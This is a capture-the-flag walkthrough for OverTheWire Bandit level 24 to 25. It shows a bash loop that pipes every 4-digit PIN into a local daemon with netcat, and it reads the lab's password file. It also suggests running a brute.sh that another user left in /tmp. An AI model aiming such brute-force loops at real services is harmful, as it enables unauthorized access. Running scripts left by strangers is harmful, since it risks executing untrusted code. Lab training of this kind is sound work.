# 🏴 Bandit Level 24 → Level 25 – Brute-Force 4-Digit PIN

---

## 🎯 Level Goal

A daemon is listening on **port `30002`**. It will provide the password for `bandit25` if you:

1. Send the correct **password of `bandit24`**, followed by  
2. A secret **4-digit numeric PIN code** (from `0000` to `9999`)

🧠 You do **not** need to create a new connection for each attempt — this means you can **reuse the same connection** to try all combinations.

---

## 🛠 Commands You Might Use

- `nc` – netcat, used to connect to the daemon.
- `for` loops – to brute-force the PIN.
- Shell redirection or `echo` – to send inputs.

---

## 🪜 Step-by-Step Instructions

### 🔹 Step 1: Get current level's password

Ensure you have the password for `bandit24`:

```bash
cat /etc/bandit_pass/bandit24
```

Let’s assume it is: `your_password_here`  
We will store it in a variable:

```bash
export PW=your_password_here
```

---

### 🔹 Step 2: Connect to the daemon

To manually test:

```bash
nc localhost 30002
```

Then try entering:

```
your_password_here 0000
```

You will see either "Wrong!" or the actual password for the next level.

---

### 🔹 Step 3: Brute-force using a shell script

You can automate all 10,000 tries with this:

```bash
#!/bin/bash

pw="your_password_here"
for pin in $(seq -w 0000 9999); do
  echo "$pw $pin"
  sleep 0.01
done | nc localhost 30002
```

Save this script as `brute.sh`, give it execution permission, and run it:

```bash
chmod +x brute.sh
./brute.sh
```

### ⚡ Alternative: Use pre-existing brute.sh in `/tmp`

Sometimes in Bandit labs, the brute-force script is already written and stored in `/tmp` by someone else. In that case, simply run:

```bash
/tmp/brute.sh
```

✅ This saves you from writing the script yourself.

---

## ✅ Output

Once the correct PIN is sent, the server will respond with the **password for `bandit25`**.

---

## 🧭 Logging into the next level

```bash
ssh bandit25@bandit.labs.overthewire.org -p 2220
```

---

## 🧠 Notes

- `chmod +x brute.sh`: makes your script executable. The `+x` flag stands for "add execute permission".
- `seq -w 0000 9999`: generates numbers from 0000 to 9999 with leading zeroes.
- `sleep 0.01`: prevents flooding the server by spacing requests.
- If you're using a shared environment, `/tmp/brute.sh` might already exist — check it first before creating your own.

---

## 🚀 You're now ready to conquer Bandit Level 24 → 25!
